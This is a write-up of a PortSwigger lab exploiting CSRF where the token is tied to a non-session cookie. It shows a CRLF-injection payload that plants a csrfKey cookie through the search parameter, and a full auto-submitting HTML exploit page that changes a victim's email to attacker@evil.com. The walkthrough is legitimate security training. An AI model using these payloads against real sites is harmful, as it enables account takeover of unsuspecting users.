# CSRF where token is tied to non-session cookie

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie), you'll learn: CSRF where token is tied to non-session cookie! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215012927.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013305.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013311.png)

**In the previous labs, we found that the email change functionality is vulnerable to CSRF, and it uses tokens to try to prevent CSRF attacks:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type=hidden name=csrf value=hMX6roXxx4LPkQUpRCr5tJFKc5s6NzJM>
    <button class='button' type='submit'> Update email </button>
</form>
```

**Let's try to update our email address, and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013457.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013515.png)

**As you can see, this time it also include a cookie called `csrfKey`, and a parameter `csrf`!**

**Hmm... What if I change the value of `csrfKey`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013824.png)

It outputs `Invalid CSRF token`!

**And what if I change the value of `session`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215013933.png)

**It redirects me to `/login`, which is log out the current session, and also set a new `session` cookie!**

**Now, let's login as user `carlos`, and try to swap `csrfKey` cookie and `csrf` parameter from user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215014255.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215014302.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215014310.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215014327.png)

**Hmm? The `csrfKey` cookie and `csrf` parameter is exactly the same as user `wiener`!**

**The only difference is the `session` cookie!** 

This proves that the back-end's CSRF protection doesn't integrate into the session system.

Now, we still couldn't change victim's email address, as **the `csrfKey` is a cookie**! And we couldn't simply add our own cookie value.

**After poking around, I found that the home page's search box is interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215015509.png)

**Let's search something, and intercept the request in Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215015526.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215015606.png)

**When we click the `Search` button, it'll send a GET request to `/` with the parameter `search`.**

**Also, when we sent the request, it'll set a new cookie value: `LastSearchTerm=<seach_parameter_value>`!**

That being said, we can set any cookie value as we wanted.

**But how can we abuse this?**

**In [Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie), it said:**

> To send multiple cookies, multiple **`Set-Cookie`** headers should be sent in the same response.

Hmm... That means we can set multiple cookies?

**After I google this a little bit, I found this [Medium blog](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215020317.png)

**Wait. CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on [GeeksforGeeks](https://www.geeksforgeeks.org/crlf-injection-attack/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215020426.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215020439.png)

**So if the web application is vulnerable, we can injection `%0d%0a` (`\r\n`) in the request??**

Let's try that!

**Payload:**
```
/?search=anything%0d%0aSet-Cookie:csrfKey=CRLF%3b%20SameSite=None
```

> Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215022524.png)

**Nice! We've successfully set a new cookie!**

**Now, let's craft a HTTP form that performs CSRF attack on changing email!**
```html
<html>
	<head>
		<title>CSRF-5</title>
	</head>
	<body>
		<form action="https://0a38003c0466e7dbc41f2f84009200ac.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		    <input type="hidden" name="csrf" value="hMX6roXxx4LPkQUpRCr5tJFKc5s6NzJM">
		</form>
		<img src="https://0a38003c0466e7dbc41f2f84009200ac.web-security-academy.net/?search=anything%0d%0aSet-Cookie:csrfKey=cYKdlnK4AuLbcbZBymW44Vizt6UkQpRK%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>
```

**Let's break it down:**

- We've added a CSRF token value from user `wiener`
- We've added a new `img` tag, and it's forcing a user to set a new `csrfKey` cookie, which is user `wiener` value. Also, when the image is failed to load, submit the form automatically

**Armed with above information, we can try to use the `exploit server` to change victim's email address!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215021528.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215022639.png)

**After clicked `Store` button, click `Deliver exploit to victim`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215022715.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-5/images/Pasted%20image%2020221215022724.png)

We did it!

# What we've learned:

1. CSRF where token is tied to non-session cookie